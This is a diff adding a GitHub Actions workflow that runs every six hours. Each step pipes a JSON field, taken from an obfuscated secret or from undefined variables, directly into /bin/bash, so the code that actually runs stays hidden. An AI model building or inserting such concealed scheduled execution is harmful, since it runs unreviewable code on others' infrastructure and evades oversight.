@@ -1,0 +1,19 @@
+name: xidongliqian
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xidongliqian
+        env:
+          asxun95303: ${{ secrets.asxun95303 }}
+        run: |
+          echo $asxun95303 | jq -r .clg69 | /bin/bash
+          echo $l80 | jq -r .yblj25537 | /bin/bash
+          echo $rn47 | jq -r .hv2333 | /bin/bash
+
